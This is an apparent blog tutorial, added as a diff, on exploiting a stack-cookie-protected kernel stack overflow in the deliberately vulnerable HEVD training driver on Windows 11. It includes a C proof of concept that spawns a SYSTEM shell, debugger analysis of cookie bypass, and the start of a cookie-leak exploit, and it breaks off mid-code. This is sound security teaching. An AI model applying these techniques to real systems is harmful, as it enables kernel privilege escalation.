@@ -1,0 +1,1054 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>0x09 - Return of the Windows Kernel Stack Overflow // </title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.131.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="John Doe" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="/css/main.min.5b1fcc8902588589c4767187402a3c29f8b8d7a6fdef6d9f8f77045bb0d14fee.css" />
+    
+
+    
+  
+
+
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="0x09 - Return of the Windows Kernel Stack Overflow">
+  <meta name="twitter:description" content="In the last tutorial we exploited one of the most notorious bug classes in the entire industry - Race Conditions.
+In this tutorial we’re going back to a bug class we have exploited before - The Stack Overflow. However, this time we’ll be encountering an exploit mitigation known as stack cookies or canaries. That said, we’ll be skipping Windows 7 (x86) and jumping directly into Windows 11 (x64).
+It’s important to note that the core issue in relation to the security vulnerability HAS NOT changed we’ll still be exploiting a Stack Overflow.">
+
+    <meta property="og:url" content="https://wetw0rk.github.io/posts/0x09-return-of-the-stack-overflow/">
+  <meta property="og:site_name" content="wetw0rk">
+  <meta property="og:title" content="0x09 - Return of the Windows Kernel Stack Overflow">
+  <meta property="og:description" content="In the last tutorial we exploited one of the most notorious bug classes in the entire industry - Race Conditions.
+In this tutorial we’re going back to a bug class we have exploited before - The Stack Overflow. However, this time we’ll be encountering an exploit mitigation known as stack cookies or canaries. That said, we’ll be skipping Windows 7 (x86) and jumping directly into Windows 11 (x64).
+It’s important to note that the core issue in relation to the security vulnerability HAS NOT changed we’ll still be exploiting a Stack Overflow.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-02-08T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-02-08T00:00:00+00:00">
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://wetw0rk.github.io/"><img class="app-header-avatar" src="/me.png" alt="John Doe" /></a>
+      <span class="app-header-title"></span>
+      <p> </p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/wetw0rk" target="_blank" rel="noreferrer noopener me">
+            <svg class="icon icon-brand-github" viewBox="0 0 24 24" fill="currentColor"><title>GitHub</title><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
+          </a>
+        
+          <a href="https://twitter.com/wetw0rk_bot" target="_blank" rel="noreferrer noopener me">
+            <svg class="icon icon-brand-x" viewBox="0 0 24 24" fill="currentColor"><title>X</title><path d="M18.901 1.153h3.68l-8.04 9.19L24 22.846h-7.406l-5.8-7.584-6.638 7.584H.474l8.6-9.83L0 1.154h7.594l5.243 6.932ZM17.61 20.644h2.039L6.486 3.24H4.298Z"/></svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">0x09 - Return of the Windows Kernel Stack Overflow</h1>
+      <div class="post-meta">
+        <div>
+          <svg class="icon icon-calendar" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>calendar</title><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>
+          Feb 8, 2025
+        </div>
+        <div>
+          <svg class="icon icon-clock" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>clock</title><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
+          19 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <p>In the <a href="https://wetw0rk.github.io/posts/0x08-modern-windows-kernel-race-conditions/">last tutorial</a> we exploited one of the most notorious bug classes in the entire industry - <em>Race Conditions</em>.</p>
+<p>In this tutorial we’re going back to a bug class we have exploited before - The Stack Overflow. However, this time we’ll be encountering an exploit mitigation known as <strong>stack cookies</strong> or <strong>canaries</strong>. That said, we’ll be skipping Windows 7 (x86) and jumping directly into Windows 11 (x64).</p>
+<p>It’s important to note that the core issue in relation to the security vulnerability HAS NOT changed we’ll still be exploiting a Stack Overflow.</p>
+<p>Let&rsquo;s jump into a high-level overview :)</p>
+<h1 id="table-of-contents">Table of Contents</h1>
+<ul>
+<li><a href="#what-are-stack-cookies-high-level">What are Stack Cookies (High Level)</a></li>
+<li><a href="#reverse-engineering">Reverse Engineering</a>
+<ul>
+<li><a href="#crafting-a-poc">Crafting a PoC</a></li>
+<li><a href="#cookie-analysis">Mitigation Analysis</a></li>
+</ul>
+</li>
+<li><a href="#baking-cookies">Baking Cookies</a></li>
+<li><a href="#exploitation">Exploitation</a></li>
+<li><a href="#sources">Sources</a></li>
+</ul>
+<h1 id="what-are-stack-cookies-high-level">What are Stack Cookies (High Level)</h1>
+<p><em>Cookies</em> are likely one of your favorite sugary snacks, however in the context of Cyber Security this is normally a term used by exploit developers in regard to a security mitigation designed to prevent buffer overflows (also known as stack overflows). Before diving into any technical details this is best understood with a high-level overview.</p>
+<p>Imagine you have just gone to a family outing and brought chocolate chip cookies from the <a href="https://github.com/sponsors/wetw0rk">store</a> for others to eat. These cookies are from <a href="">REDACTED</a> so everyone is excited to dig in!</p>
+<p>However, your aunt makes it clear: “everyone must eat dinner before dessert”. Little do you know your aunt is jealous. Your cookies have become the star of the show! Since you’ve let her know hours prior to arriving you would be bringing these cookies, she cooked a batch indistinguishable from <a href="">REDACTED’s</a> cookies.</p>
+<p>However, she&rsquo;s added one extra ingredient&hellip;</p>
+<p><img src="/0x09-Return-of-The-Stack-Overflow/evil_raisin.png" alt="alt text"></p>
+<p>With everyone distracted eating dinner, your aunt swaps the cookies you brought for her own. It looks like her <a href="https://en.wikipedia.org/wiki/Carne_asada">carne asada</a> will once again be the star of the cookout.</p>
+<p>Once everyone finished their meals, they went in for some delicious chocolate chip cookies. However, it looks like your aunt&rsquo;s plan failed since everyone immediately tastes the raisins and <a href="">REDACTED</a> does not make raisin cookies!</p>
+<p>How does this relate to exploit mitigations?</p>
+<ul>
+<li>In this scenario you and your family would be the stack / operating system (OS) and the cookies would be the stack cookies (or canary).</li>
+<li>Your aunt would be the attacker.</li>
+<li>The cookie swap could be looked at as the stack overflow</li>
+<li>Since these cookies are unique (chocolate chip) you and your family would be easily able to identify these are not from <a href="">REDACTED</a>.</li>
+</ul>
+<p>In a very similar fashion this is what the exploit mitigation does.</p>
+<p>You see, when you exploit a stack overflow you are corrupting memory this includes variables, structures, etc. With this mitigation a “cookie” or value is added onto the stack.</p>
+<p>The way programs work is that when an application returns from a function call and execution is directed to a return address the application will perform a check to ensure the cookie (value) has not been corrupted (assuming the mitigation is enabled). Should the application or OS detect modification of this value often the operating system or application will crash - however, not in a way that benefits an attacker.</p>
+<p>If we cannot find a way to avoid this from happening (e.g using a leak), we will more than likely not be able to exploit this vulnerability.</p>
+<p>Of course, there are many ways to bypass any mitigation and today we will be doing just that!</p>
+<p>In fact, you may already be thinking &ldquo;what if our aunt used chocolate chips and not raisins&rdquo;?</p>
+<h1 id="reverse-engineering">Reverse Engineering</h1>
+<p>As with previous vulnerabilities we’ll need to gather information prior to starting exploitation: the IOCTL code (0x222007) and the vulnerable function. This is pretty easy to spot since HEVD comes with symbols and functions conveniently named so we can learn more about these bug classes.</p>
+<p><img src="/0x09-Return-of-The-Stack-Overflow/handler.png" alt="alt text"></p>
+<p>Based on the decompilation shown above we won’t be dealing with any custom structures, meaning we can proceed to take a look at the <code>TriggerBufferOverflowStackGS</code> function.</p>
+<p><img src="/0x09-Return-of-The-Stack-Overflow/vuln_func.png" alt="alt text"></p>
+<p>Looking at the above de-compilation, we can see that the cookie gets stored in the pseudo variable <code>local_38</code>, then we call <code>__security_check_cookie()</code> when exiting the function. As for the core vulnerability - we know this is a vanilla buffer overflow based on the <code>memcpy()</code> copying any buffer into pseudo code array variable <code>local_238[]</code>. Let&rsquo;s go ahead and craft a proof of concept to see what happens when we trigger this vulnerability.</p>
+<h2 id="crafting-a-poc">Crafting a PoC</h2>
+<p>Since we’re dealing with a vanilla stack overflow there’s no need to really overcomplicate this. Let’s dish out a PoC!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;psapi.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;ntdef.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;winternl.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;shlwapi.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* IOCTL */</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define STACK_OVERFLOW_GS_IOCTL 0x222007
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* Exploit Settings */</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define ALLOCATION_SIZE 0x1000
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* GetKernelModuleBase():
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Function used to obtain kernel module address */</span>
+</span></span><span style="display:flex;"><span>LPVOID <span style="color:#a6e22e">GetKernelModuleBase</span>(PCHAR pKernelModule)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> pcDriver[<span style="color:#ae81ff">1024</span>]    <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+</span></span><span style="display:flex;"><span>  LPVOID lpvTargetDriver <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  LPVOID <span style="color:#f92672">*</span>lpvDrivers     <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  DWORD dwCB             <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  DWORD dwDrivers        <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  DWORD i                <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">EnumDeviceDrivers</span>(NULL, dwCB, <span style="color:#f92672">&amp;</span>dwCB);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (dwCB <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  lpvDrivers <span style="color:#f92672">=</span> (LPVOID <span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(dwCB <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span>(LPVOID));
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (lpvDrivers <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">EnumDeviceDrivers</span>(lpvDrivers, dwCB, <span style="color:#f92672">&amp;</span>dwCB))
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    dwDrivers <span style="color:#f92672">=</span> dwCB <span style="color:#f92672">/</span> <span style="color:#66d9ef">sizeof</span>(LPVOID);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> dwDrivers; i<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">GetDeviceDriverBaseNameA</span>(lpvDrivers[i], pcDriver, <span style="color:#66d9ef">sizeof</span>(pcDriver)))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">StrStrA</span>(pcDriver, pKernelModule) <span style="color:#f92672">!=</span> NULL)
+</span></span><span style="display:flex;"><span>          lpvTargetDriver <span style="color:#f92672">=</span> lpvDrivers[i];
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">free</span>(lpvDrivers);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> lpvTargetDriver;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* CheckWin():
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Simple function to check if we&#39;re running as SYSTEM */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">CheckWin</span>(VOID)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  DWORD win <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  DWORD dwLen <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  CHAR <span style="color:#f92672">*</span>cUsername <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">GetUserNameA</span>(NULL, <span style="color:#f92672">&amp;</span>dwLen);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (dwLen <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    cUsername <span style="color:#f92672">=</span> (CHAR <span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(dwLen <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span>(CHAR));
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to allocate buffer for username check</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">GetUserNameA</span>(cUsername, <span style="color:#f92672">&amp;</span>dwLen);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  win <span style="color:#f92672">=</span> <span style="color:#a6e22e">strcmp</span>(cUsername, <span style="color:#e6db74">&#34;SYSTEM&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">free</span>(cUsername);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> (win <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">?</span> win : <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* GenerateExploitBuffer():
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Generate the buffer that will overwrite the return address and grant control over the instruction pointer. */</span>
+</span></span><span style="display:flex;"><span>DWORD <span style="color:#a6e22e">GenerateExploitBuffer</span>(LPVOID lpvNt, LPVOID lpvBuffer)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">size_t</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>payload <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)lpvBuffer;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> ALLOCATION_SIZE; i <span style="color:#f92672">+=</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">uint64_t</span>))
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>payload<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x41414141</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> i;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* Exploit():
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Stack Overflow (GS) */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">Exploit</span>(HANDLE hHEVD)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  DWORD dwExploitBuffer <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  DWORD dwBytesReturned <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  LPVOID lpvMemoryAlloc <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  lpvMemoryAlloc <span style="color:#f92672">=</span> <span style="color:#a6e22e">VirtualAlloc</span>(NULL,
+</span></span><span style="display:flex;"><span>                                ALLOCATION_SIZE,
+</span></span><span style="display:flex;"><span>                                (MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE),
+</span></span><span style="display:flex;"><span>                                PAGE_EXECUTE_READWRITE);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (lpvMemoryAlloc <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Failed to create exploitation buffer</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  dwExploitBuffer <span style="color:#f92672">=</span> <span style="color:#a6e22e">GenerateExploitBuffer</span>(NULL, lpvMemoryAlloc);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Exploit buffer size: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, dwExploitBuffer);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">DeviceIoControl</span>(hHEVD,
+</span></span><span style="display:flex;"><span>                  STACK_OVERFLOW_GS_IOCTL,
+</span></span><span style="display:flex;"><span>                  lpvMemoryAlloc,
+</span></span><span style="display:flex;"><span>                  dwExploitBuffer,
+</span></span><span style="display:flex;"><span>                  NULL,
+</span></span><span style="display:flex;"><span>                  <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>                  <span style="color:#f92672">&amp;</span>dwBytesReturned,
+</span></span><span style="display:flex;"><span>                  NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">CheckWin</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  HANDLE hHEVD <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  hHEVD <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateFileA</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">HackSysExtremeVulnerableDriver&#34;</span>,
+</span></span><span style="display:flex;"><span>                      (GENERIC_READ <span style="color:#f92672">|</span> GENERIC_WRITE),
+</span></span><span style="display:flex;"><span>                      <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>                      NULL,
+</span></span><span style="display:flex;"><span>                      OPEN_EXISTING,
+</span></span><span style="display:flex;"><span>                      FILE_ATTRIBUTE_NORMAL,
+</span></span><span style="display:flex;"><span>                      NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (hHEVD <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">Exploit</span>(hHEVD) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Exploitation success!!! Enjoy de shell!!</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;cmd.exe&#34;</span>);
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Exploitation failed, run again</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (hHEVD <span style="color:#f92672">!=</span> INVALID_HANDLE_VALUE) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CloseHandle</span>(hHEVD);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Once sent, we get a crash :)</p>
+<p><img src="/0x09-Return-of-The-Stack-Overflow/crash.png" alt="alt text"></p>
+<p>However, taking a closer look at the crash, we can see we have encountered the stack cookie / canary mitigation.</p>
+<h2 id="mitigation-analysis">Mitigation Analysis</h2>
+<p>Looking at the cookie initialization we can see that the <code>__security_cookie</code> is stored within HEVD at <code>HEVD+0x3000</code> (we can also confirm this in Ghidra). In addition, we can see that the <code>__security_cookie</code> will be XOR&rsquo;d by the value currently stored in RSP. Once complete, the result of the XOR operation is stored into <code>RSP+0x220</code> essentially an offset into the stack. Without looking at this further we can make the assumption that if we overwrite the value stored at <code>RSP+0x220</code> we&rsquo;ll trigger the mitigation.</p>
+<p><img src="/0x09-Return-of-The-Stack-Overflow/cookie_init.png" alt="alt text"></p>
+<p>If we re-launch the exploit and break at the start of <code>TriggerBufferOverflowStackGS</code>, we can confirm the cookie is stored in HEVD&rsquo;s memory:</p>
+<p><img src="/0x09-Return-of-The-Stack-Overflow/cookie.png" alt="alt text"></p>
+<p>We further confirm this when we get to the XOR operation. Which as shown below, we can see is simply the current stack address NOT a hardcoded value of some sort.</p>
+<p><img src="/0x09-Return-of-The-Stack-Overflow/rsp_xor.png" alt="alt text"></p>
+<p>If we step once more, we can see this new value stored in RAX will be placed onto the stack. What if we restored this once corrupted?</p>
+<p><img src="/0x09-Return-of-The-Stack-Overflow/new_rax.png" alt="alt text"></p>
+<p>You may have issues during analysis with such a large buffer, so go ahead and decrease the buffer size to 0x900 bytes. Once done, re-run the experiment above and run <code>!analyze -v</code>. This time our final cookie after the XOR operation is ffff40da07033567 and RSP+0x220 pointed to ffffe58347db76f0, with that we can set a breakpoint at HEVD+0x867b9. At this point if we continue execution we can see we take a jump, if we continued (we won&rsquo;t) we&rsquo;d end up calling the __security_check_cookie() function. If we dump the address where the cookie was stored we can see we have corrupted it. However if we restore it and continue&hellip;</p>
+<p>We get control over the instruction pointer :)</p>
+<p><img src="/0x09-Return-of-The-Stack-Overflow/cookie_swap.png" alt="alt text"></p>
+<p>This gives us a solid high-level overview on how we can bypass this mitigation.</p>
+<h1 id="baking-cookies">Baking Cookies</h1>
+<p>So as with other exploits we&rsquo;ve written throughout this HEVD &ldquo;course&rdquo; you may be thinking this would be as simple as getting the base address of HEVD and reading the memory location where the cookie was located. However, quickly (stubbornly) we’d learn this was not the case. We need to find a leak, in our case we could re-use the Write-What-Where / Arbitrary Write vulnerability&hellip;</p>
+<p><img src="/0x09-Return-of-The-Stack-Overflow/www.png" alt="alt text"></p>
+<p>Let&rsquo;s write a PoC and test it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;psapi.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;ntdef.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;winternl.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;shlwapi.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* IOCTL */</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define STACK_OVERFLOW_GS_IOCTL 0x222007
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define ARBITRARY_WRITE_IOCTL 0x22200b
